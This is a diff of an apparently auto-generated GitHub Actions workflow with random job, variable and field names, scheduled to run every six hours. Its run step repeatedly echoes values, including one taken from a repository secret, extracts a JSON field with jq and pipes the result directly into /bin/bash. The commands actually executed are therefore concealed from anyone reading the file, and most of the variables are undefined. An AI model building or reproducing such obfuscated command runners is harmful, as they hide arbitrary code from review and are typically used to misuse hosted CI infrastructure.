@@ -1,9 +1,8 @@
 name: tujiulong4219
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 3/6 * * *'
+    - cron: '59 2/6 * * *'
 
 jobs:
   build:
@@ -13,24 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: tujiulong4219
         env:
-          yfpmk57500: ${{ secrets.yfpmk57500 }}
+          ycwc42033: ${{ secrets.ycwc42033 }}
         run: |
-          echo $yfpmk57500 | jq -r .iqv26 | /bin/bash
-          echo $h723 | jq -r .wb32743 | /bin/bash
-          echo $qgn7525 | jq -r .jcx160 | /bin/bash
-          echo $vojz97652 | jq -r .pzta33744 | /bin/bash
-          echo $ljcw08 | jq -r .zwzfm9 | /bin/bash
-          echo $v0 | jq -r .yfhol919 | /bin/bash
-          echo $msywf1 | jq -r .w7327 | /bin/bash
-          echo $ujng5 | jq -r .afii72 | /bin/bash
-          echo $akrze7276 | jq -r .anvla861 | /bin/bash
-          echo $zd9 | jq -r .lbdy42288 | /bin/bash
-          echo $ku79 | jq -r .kxw81723 | /bin/bash
-          echo $vn262 | jq -r .k6 | /bin/bash
-          echo $yqzjt8924 | jq -r .jbi5 | /bin/bash
-          echo $mntr5458 | jq -r .omah380 | /bin/bash
-          echo $re1 | jq -r .dhc8226 | /bin/bash
-          echo $ryf367 | jq -r .edaik174 | /bin/bash
-          echo $gw31 | jq -r .s448 | /bin/bash
-          echo $qij654 | jq -r .pv3 | /bin/bash
+          echo $ycwc42033 | jq -r .eg72 | /bin/bash
+          echo $qvr6 | jq -r .zf09206 | /bin/bash
+          echo $diy1476 | jq -r .pydn0 | /bin/bash
+          echo $uj60928 | jq -r .eijjf0 | /bin/bash
+          echo $b7 | jq -r .rkhva236 | /bin/bash
+          echo $pbtym86 | jq -r .a1 | /bin/bash
+          echo $cje86 | jq -r .ip18846 | /bin/bash
+          echo $nqjmq9 | jq -r .rhbm246 | /bin/bash
+          echo $qzb575 | jq -r .g3951 | /bin/bash
+          echo $pcbca37693 | jq -r .betp82671 | /bin/bash
+          echo $abrog128 | jq -r .pcku20745 | /bin/bash
+          echo $qs7147 | jq -r .n97703 | /bin/bash
+          echo $r53998 | jq -r .r008 | /bin/bash
+          echo $ssr4537 | jq -r .jof049 | /bin/bash
+          echo $yhszr7 | jq -r .p60 | /bin/bash
+          echo $myl70885 | jq -r .zl7 | /bin/bash
 
